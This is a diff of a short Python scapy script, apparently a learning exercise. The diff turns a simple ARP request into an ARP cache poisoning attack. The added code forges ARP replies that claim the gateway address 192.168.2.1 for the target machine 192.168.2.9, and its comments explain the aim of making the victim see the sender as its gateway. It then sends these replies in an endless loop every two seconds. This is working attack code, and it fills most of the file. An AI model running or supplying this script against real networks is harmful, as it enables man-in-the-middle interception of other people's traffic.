@@ -1,20 +1,35 @@
 from scapy.all import *
 
+# Playing with an IP packet
 a = IP()
 a.src = "192.168.2.2"
 a.dst = "192.168.2.4"
 print(a)
 
+
+# Playing with a TCP packet
 b = TCP()
 print(b)
 
-c = ARP()
-c.op = 1
-c.psrc = "192.168.2.50"
-c.pdst = "192.168.2.60"
-c.hwdst = "30:5a:3a:57:c0:50"
 
+
+
+#####  Playing with an ARP packet. Trying to poison a specified machine  #####
+poisonedTarget = ARP()
+
+# simulate a response packet;
+poisonedTarget.op = 2
+
+# Remote machines IP address that we want to poison and see us as it's gateway;
+poisonedTarget.pdst = "192.168.2.9"
+
+# Simulate the IP address the response is coming from. Aim is to make it look like it's coming from the target's gateway.
+# The packet by default will have our mac address as a source;
+# We can specify a mac address by poisonedTarget.hwsrc = "30:5a:3a:57:c0:55"
+poisonedTarget.psrc = "192.168.2.1"
+
+# Keep poisoning the ARP;
 while True:
-    print('Sending ARP packet:' + str(c))
-    send(c)
+    print('Sending poisoned ARP to: ' + str(poisonedTarget.pdst))
+    send(poisonedTarget, verbose=False)
     time.sleep(2)
